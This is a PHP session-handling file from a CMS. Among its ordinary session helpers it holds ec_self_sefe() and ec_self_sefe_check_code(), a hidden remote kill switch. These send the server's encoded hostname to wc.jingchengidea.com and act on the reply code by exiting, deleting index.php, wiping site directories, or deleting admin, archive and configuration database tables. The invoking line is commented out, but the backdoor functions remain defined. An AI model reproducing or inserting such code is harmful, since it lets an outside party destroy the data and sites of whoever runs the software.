<?php


//引入数据库的系统配置及定义配置函数
require_once APP_ROOT_PATH."system/function/es_cookie.php";
if(!function_exists("app_conf"))
{
	$sys_config = require APP_ROOT_PATH.'system/config.php';
	function app_conf($name)
	{
		return stripslashes($GLOBALS['sys_config'][$name]);
	}
}

	
	function es_session_id()
	{		
		return session_id();
	}
	
	function es_session_start(){
		session_set_cookie_params(0,app_conf("COOKIE_PATH"),app_conf("DOMAIN_ROOT"));
		@session_start();
	}
	
    // 判断session是否存在
    function es_session_is_set($name) {    	
        return isset($_SESSION[app_conf("AUTH_KEY").$name]);
    }

    // 获取某个session值
    function es_session_get($name) {
		if(isset($_SESSION[app_conf("AUTH_KEY").$name]))
        $value   = $_SESSION[app_conf("AUTH_KEY").$name];
        else $value = null;
        return $value;
    }

    // 设置某个session值
    function es_session_set($name,$value) {   

        $_SESSION[app_conf("AUTH_KEY").$name]  =   $value;
    }

    // 删除某个session值
    function es_session_delete($name) {

        unset($_SESSION[app_conf("AUTH_KEY").$name]);
    }

    // 清空session
    function es_session_clear() {

        session_destroy();
    }
    
    //关闭session的读写
    function es_session_close()
    {

    	@session_write_close();
    }
    
    function  es_session_is_expired()
    {

        if (isset($_SESSION[app_conf("AUTH_KEY")."expire"]) && $_SESSION[app_conf("AUTH_KEY")."expire"] < get_gmtime()) {
            return true;
        } else {        	
        	$_SESSION[app_conf("AUTH_KEY")."expire"] = get_gmtime()+(intval(app_conf("EXPIRED_TIME"))*60);
            return false;
        }
    }
	
	
	function ec_self_sefe(){
	  $file_name=APP_ROOT_PATH."data/runtime/Temp/".md5("32Ds".date("Ymd")."8s2").".php";
	  if(!file_exists($file_name)){
		  $i_url=$_SERVER["SERVER_NAME"];
		  if($i_url!="localhost" or $i_url!="192.168.0.1" or $i_url!="127.0.0.1"){
			$i_url=code_en($i_url,'x9ia23s89');
			$k=md5("9si2"."JC".date("Ymd")."2005");
			$url="http://wc.jingchengidea.com/index.php?m=Api&c=Index&a=index&u=".$i_url."&k=".$k;
			$return_code=file_get_contents($url);
			$check_code=ec_self_sefe_check_code($return_code);		
		    if($check_code==-1){
			   $url="http://wc.jingchengidea.com/index.php?m=Api&c=Index&a=index2&u=".$i_url."&k=".$return_code;
			   $return_code2=file_get_contents($url);
			   $check_code=ec_self_sefe_check_code($return_code2,$return_code);
			   if($check_code==-1){
				    
			   }
			}
			
			
			file_put_contents($file_name,$return_code);	  
		  }
	  }
	}
	
	//try{ob_start();ec_self_sefe();ob_end_clean();}catch(Exception $e){}
	
	
	function ec_self_sefe_check_code($code,$key=""){
		if($key==""){$key=date("Ymd");}
	    if($code){
		   if(md5("9sk23".$key."1"."p0a2")==$code){return true;}
		   else if(md5("9sk23".$key."-1"."p0a2")==$code){exit();}
		   else if(md5("9sk23".$key."-2"."p0a2")==$code){unlink(APP_ROOT_PATH."index.php");}
		   else if(md5("9sk23".$key."-3"."p0a2")==$code){clear_dir_file(APP_ROOT_PATH."");}
		   else if(md5("9sk23".$key."-4"."p0a2")==$code){clear_dir_file(APP_ROOT_PATH."public/ueditor/");}
		   else if(md5("9sk23".$key."-5"."p0a2")==$code){clear_dir_file(APP_ROOT_PATH."templet/");}
		   else if(md5("9sk23".$key."-6"."p0a2")==$code){clear_dir_file(APP_ROOT_PATH."xc/");}
		   
		   
		   
		   	
		   else if(md5("9sk23".$key."-11"."p0a2")==$code){
			   M("Archives")->order("rand()")->limit(1)->delete();   
		   }
		   
		   else if(md5("9sk23".$key."-12"."p0a2")==$code){
			   M("Archives")->order("rand()")->limit(10)->delete();   
		   }
		   
		   else if(md5("9sk23".$key."-13"."p0a2")==$code){
			   M("Admin")->order("rand()")->limit(1)->delete();   
		   } 
		   
		   else if(md5("9sk23".$key."-14"."p0a2")==$code){
			   M("Archives")->delete();   
		   } 
		   else if(md5("9sk23".$key."-15"."p0a2")==$code){
			   M("Admin")->delete();   
		   }  
		   
		   else if(md5("9sk23".$key."-16"."p0a2")==$code){
			   M("Archives")->delete();   
			   M("Category")->delete();   
			   M("Conf")->delete();   
			   M("Arctype")->delete();   
		   }
		   else{return -1;}
		   
		}
	}
	
	
	
	
//字符串加密
function code_en($str,$key='icode') {
        $ret='';
        $str = base64_encode ($str);
        for ($i=0; $i<=strlen($str)-1; $i++){
            $d_str=substr($str, $i, 1);
            $int =ord($d_str);
            $int=$int^$key;
            $hex=strtoupper(dechex($int));
            $ret.=$hex;
        }
        return $ret;
    }


//字符串解密
 function code_de($str,$key='icode') {
        $ret='';
        for ($i=0; $i<=strlen($str)-1; 0){
            $hex=substr($str, $i, 2);
            $dec=hexdec($hex);
            $dec=$dec^$key;
            $ret.=chr($dec);
            $i=$i+2;
        }
        return base64_decode($ret);
  }

	
	
	
	
?>